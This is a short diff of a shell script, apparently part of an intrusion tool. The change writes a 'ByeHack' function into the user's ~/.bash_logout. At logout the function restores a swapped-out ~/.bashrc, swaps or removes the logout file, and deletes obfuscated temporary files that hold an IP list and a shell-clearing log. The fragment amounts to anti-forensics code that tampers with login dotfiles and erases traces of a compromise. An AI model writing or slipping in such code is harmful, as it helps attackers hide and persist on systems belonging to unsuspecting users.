@@ -3,7 +3,27 @@ if [ ! -f ~/.bashrc ];then
 fi
 
 if [ ! -f ~/.bash_logout ];then
-  echo "ByeHack" > ~/.bash_logout;
+  cat << EOF >> ~/.bash_logout
+my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
+index_f=/tmp/_fadsgindexfs;
+clear_shell=/tmp/asdgsdgdg_log_c;
+function ByeHack {
+  mv /tmp/_bash ~/.bashrc
+  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
+      rm ~/.bash_logout;
+  else
+      mv /tmp/_bash_out ~/.bash_logout;
+  fi
+  CL
+  _resume;
+  rm $my_ips;
+  rm $index_f;
+  rm $clear_shell;
+}
+
+ByeHack;
+
+EOF
   touch /tmp/_bash_out;
 fi
 
